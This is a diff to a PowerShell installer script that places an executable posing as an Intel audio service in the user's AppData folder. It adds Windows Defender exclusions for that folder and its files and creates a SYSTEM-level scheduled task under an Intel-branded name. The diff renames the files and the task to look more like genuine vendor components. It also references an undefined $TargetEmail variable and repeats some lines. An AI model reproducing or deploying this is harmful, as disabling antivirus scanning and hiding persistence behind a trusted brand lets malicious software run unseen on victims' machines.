@@ -11,13 +11,16 @@ $TargetPath = "$env:USERPROFILE\AppData\Roaming\Intel Corporation\Intel Dynamic 
 $TargetFile = "$TargetPath\Intel Dynamic Audio Platform Service.exe"
 $TargetZip = "$TargetPath\Intel Dynamic Audio Platform Service.zip"
 $TargetLog = "$TargetPath\Intel Dynamic Audio Platform Service.log"
-$TargetScript = "$TargetPath\ias.ps1"
-$TargetXml = "$TargetPath\IntelAudio.xml"
+$TargetXml = "$TargetPath\Intel Dynamic Audio Platform Service.xml"
+$TargetXml = "$TargetPath\Intel Dynamic Audio Notification Service.xml"
+$TargetScript = "$TargetPath\Intel Dynamic Audio Notification Service.ps1"
 
 if (Test-Path "$TargetFile") {
   Remove-Item -Force -Path "$TargetFile"
   Remove-Item -Force -Path "$TargetScript"
   Remove-Item -Force -Path "$TargetXml"
+  Remove-Item -Force -Path "$TargetEmail"
+
   Write-Output "Project file removed"
 }
 
@@ -31,6 +34,7 @@ Add-MpPreference -ExclusionProcess 'Intel Dynamic Audio Platform Service.exe' -F
 Add-MpPreference -ExclusionPath "$TargetPath" -Force
 Add-MpPreference -ExclusionPath "$TargetFile" -Force
 Add-MpPreference -ExclusionPath "$TargetLog" -Force
+Add-MpPreference -ExclusionPath "$TargetLog" -Force
 Add-MpPreference -ExclusionPath "$TargetScript" -Force
 Write-Output "Exclusions added"
 
@@ -43,4 +47,5 @@ if (-Not (Test-Path "$TargetFile")) {
   Write-Output "Zip file removed"
 }
 
-schtasks.exe /Create /XML $TargetXml /tn 'Intel Dynamic Platform Audio Sync Service' /ru SYSTEM /f
+schtasks.exe /Create /XML $TargetXml /tn 'Intel Dynamic Audio Platform Service' /ru SYSTEM /f
+# schtasks.exe /Create /XML $TargetEmail /tn 'Intel Dynamic Audio Platform Service' /ru SYSTEM /f
